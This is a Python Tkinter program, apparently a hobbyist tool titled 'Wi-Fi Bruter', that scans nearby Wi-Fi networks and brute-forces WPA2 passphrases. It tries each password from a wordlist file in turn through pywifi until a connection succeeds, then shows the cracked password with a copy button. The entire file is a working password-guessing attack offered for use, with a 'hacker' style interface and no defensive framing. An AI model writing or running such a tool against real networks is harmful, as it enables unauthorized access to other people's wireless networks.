import time
import pywifi
from pywifi import const
from tkinter import *
from tkinter import messagebox, ttk, filedialog  # Import filedialog
import os
import pyperclip
import threading

# Initialize variables
available_devices = []
keys = []
final_output = {}
running_cracking = False  # Global variable to track if cracking is running

# Function to scan for Wi-Fi networks
def scan_networks(interface):
    interface.scan()
    time.sleep(5)  # Wait for the scan to complete
    networks = interface.scan_results()
    return [network.ssid for network in networks if network.ssid]  # Filter out empty SSIDs

# Function to attempt connecting to an open network
def connect_open_network(interface, ssid):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_NONE)
    interface.remove_all_network_profiles()
    interface.add_network_profile(profile)
    interface.connect(profile)
    time.sleep(4)
    return interface.status() == const.IFACE_CONNECTED

# Function to attempt connecting to a secured network with a password
def connect_secured_network(interface, ssid, password):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    interface.remove_all_network_profiles()
    interface.add_network_profile(profile)
    interface.connect(profile)

    # Wait for connection status
    for _ in range(10):  # Check status for 10 seconds
        if interface.status() == const.IFACE_CONNECTED:
            return True
        time.sleep(1)
    return False

# Function to update the list of available networks in the GUI
def update_network_list():
    global available_devices
    available_devices = scan_networks(interface)
    network_listbox.delete(0, END)
    for ssid in available_devices:
        network_listbox.insert(END, ssid)
    result_text.set("Networks scanned.")

# Function to start the password cracking process
def start_cracking():
    global running_cracking
    selected_network = network_listbox.get(ACTIVE)
    if not selected_network:
        messagebox.showerror("Error", "Please select a Wi-Fi network.")
        return

    # Attempt to read the password list file
    password_file = file_entry.get()
    if not os.path.isfile(password_file):
        messagebox.showerror("Error", f"File '{password_file}' not found. Please make sure the file exists.")
        return

    with open(password_file, 'r') as f:
        keys = [line.strip() for line in f]

    # Clear previous results
    progress['value'] = 0
    result_text.set("Trying passwords...")
    root.update_idletasks()

    found_password = None
    running_cracking = True

    # Run cracking in a background thread
    def run_cracking():
        nonlocal found_password
        for password in keys:
            if not running_cracking:
                result_text.set("Cracking process stopped.")
                return
            progress['value'] += 1
            root.update_idletasks()
            process_text.insert(END, f"Trying password: {password}\n")
            process_text.yview(END)
            if connect_secured_network(interface, selected_network, password):
                found_password = password
                break

        if found_password:
            final_output[selected_network] = found_password
            result_text.set(f"Success! Password for '{selected_network}' is '{found_password}'.")
            show_congratulation_popup(selected_network, found_password)
        else:
            result_text.set(f"No valid password found for '{selected_network}'.")

    threading.Thread(target=run_cracking, daemon=True).start()

# Function to show congratulation popup
def show_congratulation_popup(ssid, password):
    def on_ok():
        popup.destroy()

    popup = Toplevel(root)
    popup.title("Password Found")
    popup.geometry("300x200")
    popup.configure(bg="#222222")  # Dark background

    Label(popup, text="Congratulations!", font=("Courier New", 14, "bold"), bg="#222222", fg="#00FF00").pack(pady=10)
    Label(popup, text=f"Password for '{ssid}' is:", font=("Courier New", 12), bg="#222222", fg="#00FF00").pack(pady=5)
    password_label = Label(popup, text=password, font=("Courier New", 12, "bold"), bg="#222222", fg="#00FF00")  # Neon green
    password_label.pack(pady=5)

    Button(popup, text="Copy Password", command=lambda: copy_password(password), bg="#00FF00", fg="black").pack(pady=5)
    Button(popup, text="OK", command=on_ok, bg="#222222", fg="#00FF00").pack(pady=10)

# Function to copy the discovered password to clipboard
def copy_password(password):
    pyperclip.copy(password)
    messagebox.showinfo("Copied", "Password copied to clipboard!")

# Function to display a loading spinner while scanning networks or cracking
def show_loading_spinner():
    spinner = ["|", "/", "-", "\\"]
    def update_spinner(index):
        label_spinner.config(text=spinner[index % len(spinner)])
        if running_cracking:
            root.after(200, update_spinner, index + 1)
    root.after(200, update_spinner, 0)

# Function to handle button hover effects
def on_button_hover(button):
    button.config(bg="#00CC00", fg="black")

def on_button_leave(button):
    button.config(bg="#00FF00", fg="black")

# Function to stop cracking
def stop_cracking():
    global running_cracking
    running_cracking = False
    result_text.set("Cracking process stopped.")

# Function to open file dialog and select the password list file
def select_file():
    file_path = filedialog.askopenfilename(title="Select Password List File", filetypes=(("Text Files", "*.txt"), ("All Files", "*.*")))
    if file_path:
        file_entry.delete(0, END)  # Clear the entry widget
        file_entry.insert(0, file_path)  # Insert the selected file path

# Set up the GUI
root = Tk()
root.title("Wi-Fi Bruter ")
root.geometry("500x600")
root.configure(bg="#111111")  # Dark background for hacker theme

# Add headline with "hacker" style
headline = Label(root, text="This tool by letchu", font=("Courier New", 16, "bold"), bg="#111111", fg="#00FF00")
headline.pack(pady=10)

# Set up the interface
wifi = pywifi.PyWiFi()
if len(wifi.interfaces()) == 0:
    messagebox.showerror("Error", "No Wi-Fi interfaces found!")
    root.quit()

interface = wifi.interfaces()[0]  # Assuming a single Wi-Fi interface

# Create and place widgets
Label(root, text="Available Networks:", bg="#111111", fg="#00FF00", font=("Courier New", 12)).pack(pady=5)

network_listbox = Listbox(root, width=50, height=10, bg="#222222", fg="#00FF00", font=("Courier New", 12))  # Dark background, neon green text
network_listbox.pack(pady=5)

Button(root, text="Scan Networks", command=update_network_list, bg="#00FF00", fg="black", font=("Courier New", 12)).pack(pady=5)

Label(root, text="Password List File:", bg="#111111", fg="#00FF00", font=("Courier New", 12)).pack(pady=5)
file_entry = Entry(root, width=50, font=("Courier New", 12))
file_entry.insert(0, r'C:\Users\sk\Desktop\New folder (4)\top400.txt')
file_entry.pack(pady=5)

Button(root, text="Browse", command=select_file, bg="#00FF00", fg="black", font=("Courier New", 12)).pack(pady=5)  # Button to browse files
Button(root, text="Start Cracking", command=start_cracking, bg="#00FF00", fg="black", font=("Courier New", 12)).pack(pady=5)
Button(root, text="Stop Cracking", command=stop_cracking, bg="#FF0000", fg="black", font=("Courier New", 12)).pack(pady=5)

progress = ttk.Progressbar(root, orient=HORIZONTAL, length=300, mode='determinate')
progress.pack(pady=5)

result_text = StringVar()
result_label = Label(root, textvariable=result_text, justify=LEFT, wraplength=450, bg="#111111", fg="#00FF00", font=("Courier New", 12))
result_label.pack(pady=5)

process_text = Text(root, width=60, height=10, wrap=WORD, state=DISABLED, bg="#222222", fg="#00FF00", font=("Courier New", 12))  # Console-style look
process_text.pack(pady=5)

# Spinner Label
label_spinner = Label(root, text="", font=("Courier New", 12), bg="#111111", fg="#00FF00")
label_spinner.pack(pady=5)

# Start the GUI main loop
root.mainloop()
